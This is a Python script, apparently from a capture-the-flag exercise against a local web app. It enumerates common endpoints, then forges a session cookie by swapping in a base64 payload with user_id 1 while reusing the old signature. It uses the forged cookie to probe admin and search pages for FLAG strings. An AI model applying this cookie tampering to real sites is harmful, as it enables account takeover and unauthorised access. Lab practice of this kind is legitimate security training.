import requests
import base64
import json
import re
import time

# Use the cookie template (no signature validation)
cookie_template = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"
parts = cookie_template.split('.')
_, timestamp, signature = parts

print("[*] Systematic endpoint discovery and testing\n")

# Common endpoints to test (from context and typical patterns)
endpoints_to_test = [
    "/", "/home", "/dashboard", "/login", "/logout", "/profile", "/user", "/admin",
    "/search", "/api", "/api/user", "/api/profile", "/settings", "/account",
    "/trade", "/portfolio", "/orders", "/transactions", "/balance"
]

headers = {'Cookie': f'session={cookie_template}'}

# Test each endpoint with current session
print("[*] Testing endpoints with current session:\n")
for endpoint in endpoints_to_test:
    try:
        url = f'http://127.0.0.1:33198{endpoint}'
        response = requests.get(url, headers=headers, timeout=3, allow_redirects=False)
        
        # Extract flag patterns
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        if response.status_code == 200:
            print(f"[+] {endpoint:20} | Status: {response.status_code} | Length: {len(response.text):>5}B")
            if flags:
                print(f"    [!] FLAGS: {flags}")
        elif response.status_code == 302:
            print(f"[>] {endpoint:20} | Status: {response.status_code} -> {response.headers.get('Location', 'N/A')}")
        elif response.status_code == 404:
            pass  # Skip 404s in output
        else:
            print(f"[?] {endpoint:20} | Status: {response.status_code}")
            
    except Exception as e:
        print(f"[!] {endpoint:20} | Error: {e}")

# Now test with user_id=1 to see if we can access admin or privileged data
print("\n[*] Testing with user_id=1 (potential admin):\n")
test_payload = {"user_id": 1}
payload_str = json.dumps(test_payload, separators=(',', ':'))
payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')
tampered_cookie = f"{payload_b64}.{timestamp}.{signature}"
headers_tampered = {'Cookie': f'session={tampered_cookie}'}

admin_endpoints = ["/", "/admin", "/dashboard", "/profile", "/account", "/settings"]
for endpoint in admin_endpoints:
    try:
        url = f'http://127.0.0.1:33198{endpoint}'
        response = requests.get(url, headers=headers_tampered, timeout=3)
        
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        if response.status_code == 200:
            if len(response.text) != 1184:  # Different length indicates different content
                print(f"[ANOMALY] user_id=1 | {endpoint:15} | Length: {len(response.text)}B (DIFFERENT!)")
                
                if flags:
                    print(f"    [!] FLAGS: {flags}")
        else:
            print(f"[i] user_id=1 | {endpoint:15} | Status: {response.status_code}")
            
    except Exception as e:
        pass

# Let's also try the search endpoint since it was in context
print("\n[*] Testing /search endpoint:\n")
search_urls = [
    'http://127.0.0.1:33198/search?q=test',
    'http://127.0.0.1:33198/search?query=test',
    'http://127.0.0.1:33198/search/search?term=test'
]

for url in search_urls:
    try:
        response = requests.get(url, headers=headers_tampered, timeout=3)
        print(f"Search test: {url.split('/')[-1]:30} | Status: {response.status_code}")
        
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"    [!] FLAGS: {flags}")
            
    except Exception as e:
        print(f"[!] Search error on {url}: {e}")
